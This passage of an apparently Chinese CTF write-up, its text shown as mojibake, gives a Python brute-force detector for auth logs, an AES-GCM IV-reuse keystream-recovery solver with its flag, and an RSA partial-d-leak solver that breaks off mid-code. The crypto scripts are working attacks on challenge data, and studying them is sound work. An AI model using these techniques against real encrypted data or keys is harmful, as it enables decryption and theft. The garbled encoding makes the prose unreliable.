class="hljs-number">5</span>æ¬¡å¤±è´¥ï¼Œå¹¶ä¸” ç´§æ¥ ç¬¬<span class="hljs-number">5</span>æ¬¡å¤±è´¥ ä¸‹ä¸€æ¬¡å°è¯•æˆåŠŸã€‚ æ£€æµ‹åˆ°ä¸Šè¿°æ¨¡å¼çš„æº<span class="hljs-built_in">IP</span>è®°ä¸ºä¸€æ¬¡æš´åŠ›ç ´è§£æˆåŠŸè¿¹è±¡ã€‚<br><br>ä»»åŠ¡ï¼šç»™å®šæŒ‰æ—¶é—´æ’åºçš„ auth<span class="hljs-number">.</span>logï¼ˆæ ¼å¼ï¼šYYYY-mm-<span class="hljs-built_in">dd</span> HH:MM:<span class="hljs-built_in">SS</span> RESULT user=&lt;u&gt; <span class="hljs-built_in">ip</span>=&lt;a<span class="hljs-number">.</span>b<span class="hljs-number">.</span>c<span class="hljs-number">.</span>d&gt;ï¼‰ï¼Œ è¾“å‡º å‡ºç°è¿‡è¯¥æ¨¡å¼çš„å”¯ä¸€æº<span class="hljs-built_in">IP</span>å†…å®¹ï¼Œflagæ ¼å¼ï¼šflag&#123;ip1:ip2...&#125;ï¼Œ<span class="hljs-built_in">IP</span>é¡ºåºä»å°åˆ°å¤§ã€‚<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_brute_force_ips</span>(<span class="hljs-params">log_file_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä» auth.log æ–‡ä»¶ä¸­åˆ†æå¹¶æ‰¾å‡ºç¬¦åˆç‰¹å®šæš´åŠ›ç ´è§£æ¨¡å¼çš„æº IPã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æ¨¡å¼å®šä¹‰ï¼š</span><br><span class="hljs-string">    åœ¨10åˆ†é’Ÿå†…ï¼ŒåŒä¸€æºIPé’ˆå¯¹åŒä¸€ç”¨æˆ·è¿ç»­5æ¬¡ç™»å½•å¤±è´¥ï¼Œ</span><br><span class="hljs-string">    å¹¶ä¸”ç´§æ¥ç€ç¬¬5æ¬¡å¤±è´¥åçš„ä¸‹ä¸€æ¬¡å°è¯•ä¸ºæˆåŠŸã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        log_file_path (str): æŒ‰æ—¶é—´æ’åºçš„ auth.log æ–‡ä»¶è·¯å¾„ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        str: æ ¼å¼ä¸º flag&#123;ip1:ip2...&#125; çš„ç»“æœå­—ç¬¦ä¸²ï¼ŒIPæŒ‰æ•°å€¼ä»å°åˆ°å¤§æ’åºã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># æ­£åˆ™è¡¨è¾¾å¼ç”¨äºè§£ææ—¥å¿—è¡Œ</span><br>    <span class="hljs-comment"># æ ¼å¼: YYYY-mm-dd HH:MM:SS RESULT user=&lt;u&gt; ip=&lt;a.b.c.d&gt;</span><br>    log_pattern = re.<span class="hljs-built_in">compile</span>(<br>        <span class="hljs-string">r&quot;^(?P&lt;timestamp&gt;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;)\s+&quot;</span><br>        <span class="hljs-string">r&quot;(?P&lt;result&gt;SUCCESS|FAIL)\s+&quot;</span><br>        <span class="hljs-string">r&quot;user=(?P&lt;user&gt;\w+)\s+&quot;</span><br>        <span class="hljs-string">r&quot;ip=(?P&lt;ip&gt;[\d\.]+)$&quot;</span><br>    )<br><br>    <span class="hljs-comment"># å­˜å‚¨æ¯ä¸ª (ip, user) ç»„åˆçš„è¿ç»­å¤±è´¥æ—¶é—´æˆ³</span><br>    <span class="hljs-comment"># key: (ip_address, username)</span><br>    <span class="hljs-comment"># value: [timestamp1, timestamp2, ...]</span><br>    failure_states = defaultdict(<span class="hljs-built_in">list</span>)<br><br>    found_ips = <span class="hljs-built_in">set</span>()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                <span class="hljs-keyword">match</span> = log_pattern.<span class="hljs-keyword">match</span>(line.strip())<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>                data = <span class="hljs-keyword">match</span>.groupdict()<br>                timestamp = datetime.strptime(data[<span class="hljs-string">&#x27;timestamp&#x27;</span>], <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br>                result = data[<span class="hljs-string">&#x27;result&#x27;</span>]<br>                user = data[<span class="hljs-string">&#x27;user&#x27;</span>]<br>                ip = data[<span class="hljs-string">&#x27;ip&#x27;</span>]<br><br>                key = (ip, user)<br><br>                <span class="hljs-keyword">if</span> result == <span class="hljs-string">&#x27;SUCCESS&#x27;</span>:<br>                    <span class="hljs-comment"># æ£€æŸ¥æ­¤ç”¨æˆ·å’ŒIPä¹‹å‰æ˜¯å¦æœ‰å¤±è´¥è®°å½•</span><br>                    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> failure_states:<br>                        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ˜¯ç´§è·Ÿåœ¨5æ¬¡å¤±è´¥ä¹‹å</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(failure_states[key]) == <span class="hljs-number">5</span>:<br>                            first_failure_time = failure_states[key][<span class="hljs-number">0</span>]<br>                            time_difference = timestamp - first_failure_time<br><br>                            <span class="hljs-comment"># æ£€æŸ¥æ•´ä¸ªåºåˆ—ï¼ˆä»ç¬¬ä¸€æ¬¡å¤±è´¥åˆ°æˆåŠŸï¼‰æ˜¯å¦åœ¨10åˆ†é’Ÿå†…</span><br>                            <span class="hljs-keyword">if</span> time_difference.total_seconds() &lt;= <span class="hljs-number">600</span>:<br>                                found_ips.add(ip)<br><br>                        <span class="hljs-comment"># æ— è®ºæ˜¯å¦åŒ¹é…ï¼ŒæˆåŠŸéƒ½ä¼šæ‰“ç ´è¿ç»­å¤±è´¥çš„é“¾æ¡ï¼Œå› æ­¤æ¸…ç©ºçŠ¶æ€</span><br>                        <span class="hljs-keyword">del</span> failure_states[key]<br><br>                <span class="hljs-keyword">elif</span> result == <span class="hljs-string">&#x27;FAIL&#x27;</span>:<br>                    <span class="hljs-comment"># æ·»åŠ å½“å‰å¤±è´¥çš„æ—¶é—´æˆ³</span><br>                    failure_states[key].append(timestamp)<br><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(failure_states[key]) &gt; <span class="hljs-number">5</span>:<br>                        failure_states[key] = failure_states[key][-<span class="hljs-number">5</span>:]<br><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;é”™è¯¯ï¼šæ—¥å¿—æ–‡ä»¶æœªæ‰¾åˆ° -&gt; <span class="hljs-subst">&#123;log_file_path&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;å¤„ç†æ—¥å¿—æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°ç¬¦åˆæ¨¡å¼çš„IPï¼Œè¿”å›ç©ºçš„flag</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_ips:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span><br><br>    <span class="hljs-comment"># å¯¹IPåœ°å€è¿›è¡Œæ•°å€¼æ’åº</span><br>    <span class="hljs-comment"># &#x27;2.0.0.0&#x27; åº”æ’åœ¨ &#x27;10.0.0.0&#x27; ä¹‹å‰</span><br>    sorted_ips = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>(found_ips), key=<span class="hljs-keyword">lambda</span> ip: <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, ip.split(<span class="hljs-string">&#x27;.&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;:&#x27;</span>.join(sorted_ips)&#125;</span>&#125;&#125;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    log_filename = <span class="hljs-string">&#x27;auth.log&#x27;</span><br><br>    result_flag = find_brute_force_ips(log_filename)<br>    <span class="hljs-built_in">print</span>(result_flag)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.3.13:192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">5</span>.<span class="hljs-number">15</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="AES-GCM-IV-Reuse"><a href="#AES-GCM-IV-Reuse" class="headerlink" title="AES_GCM_IV_Reuse"></a>AES_GCM_IV_Reuse</h2><p>ai ä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>KNOWN_MESSAGE_STR = <span class="hljs-string">&quot;The flag is hidden somewhere in this encrypted system.&quot;</span><br>KNOWN_CIPHERTEXT_HEX = <span class="hljs-string">&quot;b7eb5c9e8ea16f3dec89b6dfb65670343efe2ea88e0e88c490da73287c86e8ebf375ea1194b0d8b14f8b6329a44f396683f22cf8adf8&quot;</span><br>FLAG_CIPHERTEXT_HEX = <span class="hljs-string">&quot;85ef58d9938a4d1793a993a0ac0c612368cf3fa8be07d9dd9f8c737d299cd9adb76fdc1187b6c3a00c866a20&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">perform_xor</span>(<span class="hljs-params">bytes1: <span class="hljs-built_in">bytes</span>, bytes2: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¯¹ä¸¤ä¸ªç­‰é•¿çš„å­—èŠ‚ä¸²è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        bytes1: ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸²ã€‚</span><br><span class="hljs-string">        bytes2: ç¬¬äºŒä¸ªå­—èŠ‚ä¸²ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        ä¸¤ä¸ªå­—èŠ‚ä¸²å¼‚æˆ–åçš„ç»“æœã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(b1 ^ b2 <span class="hljs-keyword">for</span> b1, b2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(bytes1, bytes2))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_keystream_prefix</span>(<span class="hljs-params">known_plaintext: <span class="hljs-built_in">bytes</span>, known_ciphertext: <span class="hljs-built_in">bytes</span>, length: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ ¹æ®å·²çŸ¥çš„æ˜æ–‡å’Œå¯†æ–‡ï¼Œæ¢å¤å‡ºä¸ç›®æ ‡é•¿åº¦ç›¸åŒçš„å¯†é’¥æµå‰ç¼€ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        known_plaintext: å·²çŸ¥çš„æ˜æ–‡ï¼ˆå®Œæ•´å­—èŠ‚ï¼‰ã€‚</span><br><span class="hljs-string">        known_ciphertext: å·²çŸ¥çš„å¯†æ–‡ï¼ˆå®Œæ•´å­—èŠ‚ï¼ŒåŒ…å«æ ‡ç­¾ï¼‰ã€‚</span><br><span class="hljs-string">        length: éœ€è¦æ¢å¤çš„å¯†é’¥æµçš„é•¿åº¦ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        æ¢å¤å‡ºçš„å¯†é’¥æµå‰ç¼€ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># æˆªå–æ˜æ–‡å’Œå¯†æ–‡çš„å‰ç¼€ï¼Œä½¿å…¶é•¿åº¦ä¸ç›®æ ‡é•¿åº¦ä¸€è‡´</span><br>    pt_prefix = known_plaintext[:length]<br>    ct_prefix = known_ciphertext[:length]<br><br>    <span class="hljs-comment"># å¯†é’¥æµ = æ˜æ–‡ âŠ• å¯†æ–‡</span><br>    keystream_prefix = perform_xor(pt_prefix, ct_prefix)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] å·²æˆåŠŸæ¢å¤ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(keystream_prefix)&#125;</span> å­—èŠ‚çš„å¯†é’¥æµå‰ç¼€ã€‚&quot;</span>)<br>    <span class="hljs-keyword">return</span> keystream_prefix<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag_with_keystream</span>(<span class="hljs-params">flag_ciphertext: <span class="hljs-built_in">bytes</span>, keystream: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä½¿ç”¨æ¢å¤çš„å¯†é’¥æµæ¥è§£å¯†ç›®æ ‡å¯†æ–‡ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        flag_ciphertext: ç›®æ ‡çš„å¯†æ–‡ï¼ˆå®Œæ•´å­—èŠ‚ï¼ŒåŒ…å«æ ‡ç­¾ï¼‰ã€‚</span><br><span class="hljs-string">        keystream: å·²æ¢å¤çš„å¯†é’¥æµå‰ç¼€ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        è§£å¯†åçš„ Flag å­—èŠ‚ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># ç›®æ ‡å¯†æ–‡çš„æ•°æ®éƒ¨åˆ†ï¼ˆä¸å«æ ‡ç­¾ï¼‰ä¸å¯†é’¥æµé•¿åº¦ç›¸åŒ</span><br>    flag_data = flag_ciphertext[:<span class="hljs-built_in">len</span>(keystream)]<br><br>    <span class="hljs-comment"># æ˜æ–‡ = å¯†æ–‡ âŠ• å¯†é’¥æµ</span><br>    decrypted_bytes = perform_xor(flag_data, keystream)<br>    <span class="hljs-keyword">return</span> decrypted_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--- å¼€å§‹åˆ©ç”¨ AES-GCM IV é‡ç”¨æ¼æ´è¿›è¡Œè§£å¯† ---&quot;</span>)<br><br>    <span class="hljs-comment"># 1. å°†æ‰€æœ‰è¾“å…¥ä»å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚</span><br>    known_pt_bytes = KNOWN_MESSAGE_STR.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    known_ct_bytes = binascii.unhexlify(KNOWN_CIPHERTEXT_HEX)<br>    flag_ct_bytes = binascii.unhexlify(FLAG_CIPHERTEXT_HEX)<br><br>    <span class="hljs-comment"># 2. åŠ¨æ€è®¡ç®—é•¿åº¦ä¿¡æ¯</span><br>    <span class="hljs-comment"># GCM è®¤è¯æ ‡ç­¾çš„é•¿åº¦ = (å·²çŸ¥å¯†æ–‡æ€»é•¿) - (å·²çŸ¥æ˜æ–‡é•¿åº¦)</span><br>    auth_tag_len = <span class="hljs-built_in">len</span>(known_ct_bytes) - <span class="hljs-built_in">len</span>(known_pt_bytes)<br>    <span class="hljs-comment"># Flag çš„æ˜æ–‡é•¿åº¦ = (Flagå¯†æ–‡æ€»é•¿) - (è®¤è¯æ ‡ç­¾é•¿åº¦)</span><br>    flag_len = <span class="hljs-built_in">len</span>(flag_ct_bytes) - auth_tag_len<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] åŠ¨æ€è®¡ç®—å¾—å‡ºï¼šè®¤è¯æ ‡ç­¾é•¿åº¦ = <span class="hljs-subst">&#123;auth_tag_len&#125;</span> å­—èŠ‚ï¼ŒFlag é•¿åº¦ = <span class="hljs-subst">&#123;flag_len&#125;</span> å­—èŠ‚ã€‚&quot;</span>)<br><br>    <span class="hljs-comment"># 3. æ¢å¤ä¸ Flag ç­‰é•¿çš„å¯†é’¥æµå‰ç¼€</span><br>    keystream = recover_keystream_prefix(known_pt_bytes, known_ct_bytes, flag_len)<br><br>    <span class="hljs-comment"># 4. ä½¿ç”¨å¯†é’¥æµè§£å¯† Flag</span><br>    recovered_flag = decrypt_flag_with_keystream(flag_ct_bytes, keystream)<br><br>    <span class="hljs-comment"># 5. è§£ç å¹¶å±•ç¤ºæœ€ç»ˆç»“æœ</span><br><br>    flag_str = recovered_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">45</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  è§£å¯†æˆåŠŸï¼æ¢å¤çš„ Flag ä¸º: <span class="hljs-subst">&#123;flag_str&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">45</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;GCM_IV_r3us3_1s_d4ng3r0us_f0r_s3cur1ty&#125;</span><br></code></pre></td></tr></table></figure><h2 id="rsa-dl-leak"><a href="#rsa-dl-leak" class="headerlink" title="rsa-dl_leak"></a>rsa-dl_leak</h2><p>ä¸€æ ·çš„ ai ä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> math<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_by_recovering_s</span>(<span class="hljs-params">n, e, c, t, d_low</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    é€šè¿‡æ¢å¤ p+q çš„å€¼æ¥åˆ†è§£ nï¼Œå¹¶è§£å¯†å¯†æ–‡ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æ­¤æ–¹æ³•åŸºäºä»¥ä¸‹ RSA å…³ç³»ï¼š</span><br><span class="hljs-string">    1. e*d â‰¡ 1 (mod Ï†(n))</span><br><span class="hljs-string">       =&gt; å­˜åœ¨æ•´æ•° kï¼Œä½¿å¾— e*d - k*Ï†(n) = 1 (å…¶ä¸­ 1 &lt;= k &lt; e)</span><br><span class="hljs-string">    2. d = d_unknown * 2^t + d_low</span><br><span class="hljs-string">    3. Ï†(n) = n - (p+q) + 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å°† (2) å’Œ (3) ä»£å…¥ (1) å¹¶è¿›è¡Œæ¨¡è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥å»ºç«‹ä¸€ä¸ªå…³äº s = p+q çš„åŒä½™æ–¹ç¨‹ï¼Œ</span><br><span class="hljs-string">    ç„¶åé€šè¿‡è¿­ä»£ k æ¥æ‰¾åˆ°æ­£ç¡®çš„ sï¼Œè¿›è€Œåˆ†è§£ nã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    M = <span class="hljs-number">1</span> &lt;&lt; t<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] æ¨¡æ•° M = 2^<span class="hljs-subst">&#123;t&#125;</span> å·²è®¾ç½®ã€‚&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] å¼€å§‹è¿­ä»£ kï¼ŒèŒƒå›´: 1 åˆ° <span class="hljs-subst">&#123;e - <span class="hljs-number">1</span>&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-comment"># æ­¥éª¤ 1: è¿­ä»£ k çš„æ‰€æœ‰å¯èƒ½å€¼ (1 &lt;= k &lt; e)</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br>        <span class="hljs-comment"># æ¨å¯¼è¿‡ç¨‹:</span><br>        <span class="hljs-comment"># e*d - k*Ï†(n) = 1</span><br>        <span class="hljs-comment"># e*d = 1 + k*(n - (p+q) + 1)</span><br>        <span class="hljs-comment"># ä»¤ s = p+qï¼Œåˆ™ e*d = 1 + k*(n - s + 1)</span><br>        <span class="hljs-comment"># å°† d = d_hi*M + d_low ä»£å…¥:</span><br>        <span class="hljs-comment"># e*(d_hi*M + d_low) = 1 + k*n - k*s + k</span><br>        <span class="hljs-comment"># e*d_low - 1 - k*n - k = -k*s - e*d_hi*M</span><br>        <span class="hljs-comment"># k*n + k - e*d_low + 1 = k*s (mod M)</span><br>        <span class="hljs-comment"># å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å…³äº s çš„åŒä½™æ–¹ç¨‹ A*s â‰¡ B (mod M)ï¼Œå…¶ä¸­ A=k</span><br><br>        <span class="hljs-comment"># æ­¥éª¤ 2: å»ºç«‹å…³äº s = p+q 